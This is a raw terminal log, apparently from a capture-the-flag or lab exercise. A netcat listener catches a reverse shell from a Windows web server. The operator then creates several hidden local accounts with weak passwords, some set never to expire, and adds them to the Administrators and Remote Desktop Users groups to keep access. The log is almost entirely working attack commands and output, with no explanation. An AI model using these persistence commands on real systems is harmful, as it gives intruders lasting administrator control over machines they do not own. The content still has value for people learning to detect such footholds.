
```sh
┌──(kali㉿kali)-[~]
└─$ nc -lvnp 443                                               
listening on [any] 443 ...
connect to [10.18.21.236] from (UNKNOWN) [10.10.67.28] 49838

CF E:\xampp\htdocs\internal> net user pratchett password /add
CF E:\xampp\htdocs\internal> net user

User accounts for \\

-------------------------------------------------------------------------------
Admin                    Administrator            DefaultAccount           
Equinox                  Guest                    Sunlight                 
The command completed with one or more errors.

CF E:\xampp\htdocs\internal> cmd
Microsoft Windows [Version 10.0.14393]
(c) 2016 Microsoft Corporation. All rights reserved.

E:\xampp\htdocs\internal>Equinoxadmin

E:\xampp\htdocs\internal>
CF E:\xampp\htdocs\internal> c:
CF C:\> version
CF C:\> ver
CF C:\> get-acl


    Directory: 


Path Owner                       Access                                        
---- -----                       ------                                        
C:\  NT SERVICE\TrustedInstaller CREATOR OWNER Allow  268435456...             


CF C:\> Invoke-Expression -Command "cmd.exe /c net user pratchett /add"
The command completed successfully.

CF C:\> net user

User accounts for \\

-------------------------------------------------------------------------------
Admin                    Administrator            DefaultAccount           
Equinox                  Guest                    pratchett                
Sunlight                 
The command completed with one or more errors.

CF C:\> Invoke-Expression -Command "cmd.                                                           

User accounts for \\

-------------------------------------------------------------------------------
Admin                    Administrator            DefaultAccount           
Equinox                  Guest                    pratchett                
Sunlight                 
The command completed with one or more errors.

CF C:\> Invoke-Expression -Command "cmd.exe /c net localgroup "Remote Desktop Users" pratchett /add"
CF C:\> Invoke-Expression -Command "cmd.exe /c net localgroup "Administrors" pratchett /add"
CF C:\> net localgroup

Aliases for \\WIN-8VMBKF3G815

-------------------------------------------------------------------------------
*Access Control Assistance Operators
*Administrators
*Backup Operators
*Certificate Service DCOM Access
*Cryptographic Operators
*Distributed COM Users
*Event Log Readers
*Guests
*Hyper-V Administrators
*IIS_IUSRS
*Iron
*Network Configuration Operators
*Performance Log Users
*Performance Monitor Users
*Power Users
*Print Operators
*RDS Endpoint Servers
*RDS Management Servers
*RDS Remote Access Servers
*Remote Desktop Users
*Remote Management Users
*Replicator
*Storage Replica Administrators
*System Managed Accounts Group
*Users
The command completed successfully.

CF C:\> Invoke-Expression -Command "cmd.exe /c net localgroup pratchett"
CF C:\> net user pratchett
User name                    pratchett
Full Name                    
Comment                      
User's comment               
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            3/29/2024 12:29:17 PM
Password expires             5/10/2024 12:29:17 PM
Password changeable          3/29/2024 12:29:17 PM
Password required            Yes
User may change password     Yes

Workstations allowed         All
Logon script                 
User profile                 
Home directory               
Last logon                   Never

Logon hours allowed          All

Local Group Memberships      *Users                
Global Group memberships     *None                 
The command completed successfully.

CF C:\> Add-LocalGroupMember -Group "Administrators" -Member "pratchett"
CF C:\> Add-LocalGroupMember -Group "Remote Desktop Users" -Member "pratchett"
CF C:\> net users pratchett
User name                    pratchett
Full Name                    
Comment                      
User's comment               
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            3/29/2024 12:29:17 PM
Password expires             5/10/2024 12:29:17 PM
Password changeable          3/29/2024 12:29:17 PM
Password required            Yes
User may change password     Yes

Workstations allowed         All
Logon script                 
User profile                 
Home directory               
Last logon                   Never

Logon hours allowed          All

Local Group Memberships      *Administrators       *Remote Desktop Users 
                             *Users                
Global Group memberships     *None                 
The command completed successfully.

CF C:\> Set-LocalUser -Name "pratchett" -Password (ConvertTo-SecureString "password" -AsPlainText -Force)
CF C:\> Invoke-Expression -Command "cmd.exe /c net user terry password /add"
CF C:\> Invoke-Expression -Command "cmd.exe /c net localgroup "Remote Desktop Users" terry /add"
CF C:\> Invoke-Expression -Command "cmd.exe /c net localgroup "Administrors" terry /add"
CF C:\> Add-LocalGroupMember -Group "Administrators" -Member "terry"
CF C:\> Add-LocalGroupMember -Group "Remote Desktop Users" -Member "terry"
CF C:\> net users terry
CF C:\> Invoke-Expression -Command "cmd.exe /c net user terry /add"
The command completed successfully.

CF C:\> Add-LocalGroupMember -Group "Administrators" -Member "terry"
CF C:\> Invoke-Expression -Command "cmd.exe /c net user terry2 password /add"
CF C:\> New-LocalUser -Name "terry2" -Password (ConvertTo-SecureString "password" -AsPlainText -Force) -PasswordNeverExpires:$true
CF C:\> Add-LocalGroupMember -Group "Administrators" -Member "terry2"
CF C:\> Add-LocalGroupMember -Group "Remote Desktop Users" -Member "terry2"
CF C:\> net users terry2
User name                    terry2
Full Name                    
Comment                      
User's comment               
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            3/29/2024 1:01:51 PM
Password expires             Never
Password changeable          3/29/2024 1:01:51 PM
Password required            No
User may change password     Yes

Workstations allowed         All
Logon script                 
User profile                 
Home directory               
Last logon                   Never

Logon hours allowed          All

Local Group Memberships      *Administrators       *Remote Desktop Users 
Global Group memberships     *None                 
The command completed successfully.

CF C:\> New-LocalUser -Name "terry3" -Password (ConvertTo-SecureString "Password123!" -AsPlainText -Force) -PasswordNeverExpires:$true

Name   Enabled Description
----   ------- -----------
terry3 True               


CF C:\> Add-LocalGroupMember -Group "Administrators" -Member "terry3"
CF C:\> Add-LocalGroupMember -Group "Remote Desktop Users" -Member "terry3"
CF C:\> net user terry3
User name                    terry3
Full Name                    
Comment                      
User's comment               
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            3/29/2024 1:03:59 PM
Password expires             Never
Password changeable          3/29/2024 1:03:59 PM
Password required            No
User may change password     Yes

Workstations allowed         All
Logon script                 
User profile                 
Home directory               
Last logon                   Never

Logon hours allowed          All

Local Group Memberships      *Administrators       *Remote Desktop Users 
Global Group memberships     *None                 
The command completed successfully.

CF C:\> 
^C                                                                                                                            
                                                                                                                              
┌──(kali㉿kali)-[~]
└─$ 
```
